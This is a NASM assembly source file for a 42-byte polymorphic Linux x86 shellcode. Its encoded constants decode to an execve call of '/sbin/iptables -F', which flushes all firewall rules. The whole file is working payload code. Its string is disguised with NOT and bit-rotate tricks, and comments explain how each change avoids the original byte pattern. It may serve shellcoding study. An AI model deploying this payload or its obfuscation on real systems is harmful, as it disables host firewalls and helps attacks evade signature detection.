
; Filename: execve_poly.nasm
; Author:  Matteo Malvica
; Website:  http://www.matteomalvica.com
; Size: 42 bytes

global _start

section .text

_start:
	xor eax,eax		    	;no chanches so far
	push eax
	push word 0x462d
	mov edi, esp       		;use different register than esi
	push eax
	mov ecx, 0x3656c627		;shift leftmost value to the right
	ror ecx, 4
	push ecx
	mov edx, 0x96174706		;shift rightmost value to the left
	rol edx, 4
	push edx
	mov ecx, 0xD091969D 		;NOT the string 
	not ecx
	push ecx
	mov edx, 0x8CD0D0D0 		;same as above
	not edx
	push edx
	mov ebx, esp
	push eax
	push edi
	push ebx
	mov ecx, esp	    		;outro is unchanged
	mov edx, eax
	or al, 11
	int 0x80
